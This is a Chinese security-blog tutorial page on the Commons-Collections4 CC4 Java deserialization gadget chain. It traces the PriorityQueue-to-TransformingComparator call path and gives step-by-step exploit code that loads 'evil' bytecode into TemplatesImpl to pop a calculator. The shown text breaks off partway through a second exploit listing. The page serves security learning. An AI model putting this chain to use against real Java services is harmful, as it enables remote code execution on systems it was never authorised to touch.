@@ -1,0 +1,371 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
+  java反序列化之CC4
+  #
+
+
+  CC4 链分析
+  #
+
+CC 链的漏洞一般都和transform方法分不开。
+我们前面学习的 CC1、CC6、CC3，命令执行的方法就两种，为反射或动态加载字节码。而 CC4 链中如果Commons-Collections4的版本在 4.1， InvokerTransformer类不再继承Serializable接口了，无法序列化。
+既然InvokerTransformer用不了，我们就去看看谁能替代它。这里使用的是InstantiateTransformer，它的transform方法中反射调用了构造器，接下来看看谁调用了transform()。
+在TransformingComparator类的compare()方法中调用了transform()方法，而这个方法也很常见。
+TransformingComparator#compare()：
+public int compare(final I obj1, final I obj2) {
+        final O value1 = this.transformer.transform(obj1);
+        final O value2 = this.transformer.transform(obj2);
+        return this.decorated.compare(value1, value2);
+    }
+这个链子就和之前的3条不同了。接着往前找，在java.util.PriorityQueue这个类中的siftDownUsingComparator方法中调用了compare()方法：
+private void siftDownUsingComparator(int k, E x) {
+        int half = size >>> 1;
+        while (k < half) {
+            int child = (k << 1) + 1;
+            Object c = queue[child];
+            int right = child + 1;
+            if (right < size &&
+                comparator.compare((E) c, (E) queue[right]) > 0)
+                c = queue[child = right];
+            if (comparator.compare(x, (E) c) <= 0)
+                break;
+            queue[k] = c;
+            k = child;
+        }
+        queue[k] = x;
+    }
+接着往上找，在这个类的siftDown中调用了siftDownUsingComparator："><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc4/"><meta property="og:site_name" content="S0lowalker"><meta property="og:title" content="java反序列化之CC4"><meta property="og:description" content="java反序列化之CC4 # CC4 链分析 # CC 链的漏洞一般都和transform方法分不开。
+我们前面学习的 CC1、CC6、CC3，命令执行的方法就两种，为反射或动态加载字节码。而 CC4 链中如果Commons-Collections4的版本在 4.1， InvokerTransformer类不再继承Serializable接口了，无法序列化。
+既然InvokerTransformer用不了，我们就去看看谁能替代它。这里使用的是InstantiateTransformer，它的transform方法中反射调用了构造器，接下来看看谁调用了transform()。
+在TransformingComparator类的compare()方法中调用了transform()方法，而这个方法也很常见。
+TransformingComparator#compare()：
+public int compare(final I obj1, final I obj2) { final O value1 = this.transformer.transform(obj1); final O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2); } 这个链子就和之前的3条不同了。接着往前找，在java.util.PriorityQueue这个类中的siftDownUsingComparator方法中调用了compare()方法：
+private void siftDownUsingComparator(int k, E x) { int half = size >>> 1; while (k < half) { int child = (k << 1) + 1; Object c = queue[child]; int right = child + 1; if (right < size && comparator.compare((E) c, (E) queue[right]) > 0) c = queue[child = right]; if (comparator.compare(x, (E) c) <= 0) break; queue[k] = c; k = child; } queue[k] = x; } 接着往上找，在这个类的siftDown中调用了siftDownUsingComparator："><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="docs"><meta property="article:published_time" content="2026-05-17T00:00:00+00:00"><meta property="article:modified_time" content="2026-05-17T00:00:00+00:00"><meta property="article:tag" content="Java安全"><meta property="article:tag" content="反序列化专题"><meta property="article:tag" content="CC链"><title>java反序列化之CC4 | S0lowalker</title><link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc4/><link rel=stylesheet href=/book.min.31c453d41ba8febf45a3c125de02ecdbd5a000186bc220da3d8ade8f54ed6ec1.css integrity="sha256-McRT1Buo/r9Fo8El3gLs29WgABhrwiDaPYrej1TtbsE=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.f3b8735e92aacb11c612456ae889aa7fadc9da7bad1b75639d6dd000d07b5fc7.js integrity="sha256-87hzXpKqyxHGEkVq6Imqf63J2nutG3VjnW3QANB7X8c=" crossorigin=anonymous></script></head><body dir=ltr><header class=top-header><div class=top-header-inner><div class=top-header-left><a href=https://s0lowalker.github.io/ class=top-header-title>S0lowalker</a></div><div class=top-header-right><a href=/friends>友链</a>
+<a href=https://github.com/s0lowalker target=_blank rel=noopener>GitHub</a></div></div></header><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>S0lowalker</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-5727aa49b051f298f64d3a0dfcdaac79 class=toggle checked>
+<label for=section-5727aa49b051f298f64d3a0dfcdaac79 class="flex justify-between"><a role=button>Java安全</a></label><ul><li><input type=checkbox id=section-1dc6eb9f6244b6f677832d892b22dc02 class=toggle>
+<label for=section-1dc6eb9f6244b6f677832d892b22dc02 class="flex justify-between"><a role=button>Java基础</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/jdk%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/>JDK动态代理</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java-io%E6%B5%81/>Java IO流</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/>java类的动态加载</a></li></ul></li><li><input type=checkbox id=section-c47aa3d5834730def37f0c0296806937 class=toggle checked>
+<label for=section-c47aa3d5834730def37f0c0296806937 class="flex justify-between"><a role=button>Java反序列化</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcb/>java反序列化之CB</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc7/>java反序列化之CC7</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc5/>java反序列化之CC5</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc2/>java反序列化之CC2</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc4/ class=active>java反序列化之CC4</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc3/>java反序列化之CC3</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc6/>java反序列化之CC6</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc1/>java反序列化之CC1</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Burldns%E9%93%BE/>java反序列化之URLDNS链</a></li></ul></li></ul></li><li><input type=checkbox id=section-d8d720db18be1ec4b3cb1ef74548db97 class=toggle>
+<label for=section-d8d720db18be1ec4b3cb1ef74548db97 class="flex justify-between"><a role=button>Web安全</a></label><ul><li><input type=checkbox id=section-31e4da0a6a404b93aaf2d9c04b32c84b class=toggle>
+<label for=section-31e4da0a6a404b93aaf2d9c04b32c84b class="flex justify-between"><a role=button>SQL注入</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/sqlite%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/>SQLite下的SQL注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/%E5%88%A9%E7%94%A8handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/>堆叠注入之利用handler语句获取数据</a></li></ul></li><li><input type=checkbox id=section-2885e3a564b8fe445048e1de37bef089 class=toggle>
+<label for=section-2885e3a564b8fe445048e1de37bef089 class="flex justify-between"><a role=button>SSTI</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/jinja2%E6%A8%A1%E6%9D%BF%E4%B8%8B%E9%9D%9E%E5%B8%B8%E8%A7%81%E7%9A%84ssti/>Jinja2常见关键字被ban后的SSTI</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/twig%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之twig</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/tornado%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之Tornado</a></li></ul></li><li><input type=checkbox id=section-172f63492c2abb7577d01d4bf0de9853 class=toggle>
+<label for=section-172f63492c2abb7577d01d4bf0de9853 class="flex justify-between"><a role=button>文件上传</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E4%B8%8D%E5%90%ABphp%E4%BB%A3%E7%A0%81%E7%9A%84php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0rce/>PHP文件上传不含PHP代码实现RCE的方法</a></li></ul></li><li><input type=checkbox id=section-958f36f10c11df5112dde6c43a89cde5 class=toggle>
+<label for=section-958f36f10c11df5112dde6c43a89cde5 class="flex justify-between"><a role=button>XXE</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/xxe/apache_tika_xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/>Apache Tika XXE漏洞(CVE-2025-66516)</a></li></ul></li><li><input type=checkbox id=section-db3c5efb4a73093a1b77095b857638ed class=toggle>
+<label for=section-db3c5efb4a73093a1b77095b857638ed class="flex justify-between"><a role=button>代码审计</a></label><ul><li><input type=checkbox id=section-2641018cca6e6013f05f7d61b80b4d11 class=toggle>
+<label for=section-2641018cca6e6013f05f7d61b80b4d11 class="flex justify-between"><a role=button>DVWA审计篇</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/>DVWA代码审计之命令注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81/>DVWA代码审计之不安全的验证码</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/>DVWA代码审计之暴力破解</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/>DVWA代码审计之SQL注入</a></li></ul></li></ul></li></ul></li><li><input type=checkbox id=section-87a84385a267f81ae181c29190fbccaf class=toggle>
+<label for=section-87a84385a267f81ae181c29190fbccaf class="flex justify-between"><a role=button>数据库</a></label><ul><li><a href=/docs/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93/>MySQL数据库盲区补充</a></li></ul></li><li><a href=/docs/%E5%8F%8D%E5%BC%B9shell/>反弹shell</a></li><li><a href=/docs/phpmyadmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABcve-2018-12613/>phpMyAdmin文件包含漏洞(CVE-2018-12613)</a></li><li><a href=/docs/node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%92%8C%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/>node.js原型链污染和沙箱逃逸漏洞学习笔记</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>java反序列化之CC4</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#cc4-链分析>CC4 链分析</a></li><li><a href=#逐步编写-exp>逐步编写 EXP</a><ul><li><a href=#初步编写>初步编写</a></li><li><a href=#处理报错>处理报错</a></li></ul></li><li><a href=#总结>总结</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=java反序列化之cc4>java反序列化之CC4
+<a class=anchor href=#java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bcc4>#</a></h1><h2 id=cc4-链分析>CC4 链分析
+<a class=anchor href=#cc4-%e9%93%be%e5%88%86%e6%9e%90>#</a></h2><p>CC 链的漏洞一般都和<code>transform</code>方法分不开。</p><p>我们前面学习的 CC1、CC6、CC3，命令执行的方法就两种，为反射或动态加载字节码。而 CC4 链中如果<code>Commons-Collections4</code>的版本在 4.1， <code>InvokerTransformer</code>类不再继承<code>Serializable</code>接口了，无法序列化。</p><p>既然<code>InvokerTransformer</code>用不了，我们就去看看谁能替代它。这里使用的是<code>InstantiateTransformer</code>，它的<code>transform</code>方法中反射调用了构造器，接下来看看谁调用了<code>transform()</code>。</p><p>在<code>TransformingComparator</code>类的<code>compare()</code>方法中调用了<code>transform()</code>方法，而这个方法也很常见。</p><p>TransformingComparator#compare()：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>compare</span>(<span style=color:#66d9ef>final</span> I obj1, <span style=color:#66d9ef>final</span> I obj2) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> O value1 <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>transformer</span>.<span style=color:#a6e22e>transform</span>(obj1);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> O value2 <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>transformer</span>.<span style=color:#a6e22e>transform</span>(obj2);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>decorated</span>.<span style=color:#a6e22e>compare</span>(value1, value2);
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>这个链子就和之前的3条不同了。接着往前找，在<code>java.util.PriorityQueue</code>这个类中的<code>siftDownUsingComparator</code>方法中调用了<code>compare()</code>方法：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>siftDownUsingComparator</span>(<span style=color:#66d9ef>int</span> k, E x) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> half <span style=color:#f92672>=</span> size <span style=color:#f92672>&gt;&gt;&gt;</span> 1;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> (k <span style=color:#f92672>&lt;</span> half) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>int</span> child <span style=color:#f92672>=</span> (k <span style=color:#f92672>&lt;&lt;</span> 1) <span style=color:#f92672>+</span> 1;
+</span></span><span style=display:flex><span>            Object c <span style=color:#f92672>=</span> queue<span style=color:#f92672>[</span>child<span style=color:#f92672>]</span>;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>int</span> right <span style=color:#f92672>=</span> child <span style=color:#f92672>+</span> 1;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (right <span style=color:#f92672>&lt;</span> size <span style=color:#f92672>&amp;&amp;</span>
+</span></span><span style=display:flex><span>                comparator.<span style=color:#a6e22e>compare</span>((E) c, (E) queue<span style=color:#f92672>[</span>right<span style=color:#f92672>]</span>) <span style=color:#f92672>&gt;</span> 0)
+</span></span><span style=display:flex><span>                c <span style=color:#f92672>=</span> queue<span style=color:#f92672>[</span>child <span style=color:#f92672>=</span> right<span style=color:#f92672>]</span>;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (comparator.<span style=color:#a6e22e>compare</span>(x, (E) c) <span style=color:#f92672>&lt;=</span> 0)
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>            queue<span style=color:#f92672>[</span>k<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> c;
+</span></span><span style=display:flex><span>            k <span style=color:#f92672>=</span> child;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        queue<span style=color:#f92672>[</span>k<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> x;
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>接着往上找，在这个类的<code>siftDown</code>中调用了<code>siftDownUsingComparator</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>siftDown</span>(<span style=color:#66d9ef>int</span> k, E x) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (comparator <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>)
+</span></span><span style=display:flex><span>            siftDownUsingComparator(k, x);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>            siftDownComparable(k, x);
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>在这个类的<code>heapify</code>方法中调用了<code>siftDown</code>方法：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>heapify</span>() {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> (size <span style=color:#f92672>&gt;&gt;&gt;</span> 1) <span style=color:#f92672>-</span> 1; i <span style=color:#f92672>&gt;=</span> 0; i<span style=color:#f92672>--</span>)
+</span></span><span style=display:flex><span>            siftDown(i, (E) queue<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span>);
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>再往上找，还是这个类，在<code>readObject</code>方法中调用了<code>heapify()</code>方法：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>readObject</span>(java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>ObjectInputStream</span> s)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throws</span> java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>IOException</span>, ClassNotFoundException {
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Read in size, and any hidden stuff</span>
+</span></span><span style=display:flex><span>        s.<span style=color:#a6e22e>defaultReadObject</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Read in (and discard) array length</span>
+</span></span><span style=display:flex><span>        s.<span style=color:#a6e22e>readInt</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        queue <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>size<span style=color:#f92672>]</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Read in all elements.</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> 0; i <span style=color:#f92672>&lt;</span> size; i<span style=color:#f92672>++</span>)
+</span></span><span style=display:flex><span>            queue<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> s.<span style=color:#a6e22e>readObject</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Elements are guaranteed to be in &#34;proper order&#34;, but the</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// spec has never explained what that might be.</span>
+</span></span><span style=display:flex><span>        heapify();
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>到这，利用链就找完了，接下来就是逐步满足条件的过程。</p><h2 id=逐步编写-exp>逐步编写 EXP
+<a class=anchor href=#%e9%80%90%e6%ad%a5%e7%bc%96%e5%86%99-exp>#</a></h2><h3 id=初步编写>初步编写
+<a class=anchor href=#%e5%88%9d%e6%ad%a5%e7%bc%96%e5%86%99>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> org.example;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections4.functors.InstantiateTransformer;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.xml.transform.Templates;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Field;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Files;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Paths;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>test</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        TemplatesImpl templates <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TemplatesImpl();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>extends</span> TemplatesImpl<span style=color:#f92672>&gt;</span> templatesClass <span style=color:#f92672>=</span> templates.<span style=color:#a6e22e>getClass</span>();
+</span></span><span style=display:flex><span>        Field name <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_name&#34;</span>);
+</span></span><span style=display:flex><span>        name.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        name.<span style=color:#a6e22e>set</span>(templates,<span style=color:#e6db74>&#34;abc&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field bytecodes <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_bytecodes&#34;</span>);
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> evil <span style=color:#f92672>=</span> Files.<span style=color:#a6e22e>readAllBytes</span>(Paths.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;C:\\Users\\32202\\Desktop\\CC4\\target\\classes\\org\\example\\calcexp\\Calc.class&#34;</span>));
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]</span> codes<span style=color:#f92672>=</span>{evil};
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>set</span>(templates,codes);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field tfactory <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_tfactory&#34;</span>);
+</span></span><span style=display:flex><span>        tfactory.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        tfactory.<span style=color:#a6e22e>set</span>(templates,<span style=color:#66d9ef>new</span> TransformerFactoryImpl());
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        InstantiateTransformer<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;</span> instantiateTransformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InstantiateTransformer<span style=color:#f92672>&lt;&gt;</span>(<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{Templates.<span style=color:#a6e22e>class</span>}, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{templates});
+</span></span><span style=display:flex><span>        instantiateTransformer.<span style=color:#a6e22e>transform</span>(TrAXFilter.<span style=color:#a6e22e>class</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>成功弹出计算器，接下是把<code>TransformingComparator</code>类的<code>compare()</code>方法放进去。这个类是可序列化的，所以我们也许可以通过反射来修改其调用<code>compare()</code>方法的值。</p><p>这里<code>compare()</code>要求两个参数，但是并不能达到弹计算器的效果，所以我们尝试在下一步的<code>PriorityQueue.siftUpUsingComparator()</code>来实现弹计算器。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> org.example;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections4.Transformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections4.comparators.TransformingComparator;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections4.functors.ChainedTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections4.functors.ConstantTransformer;
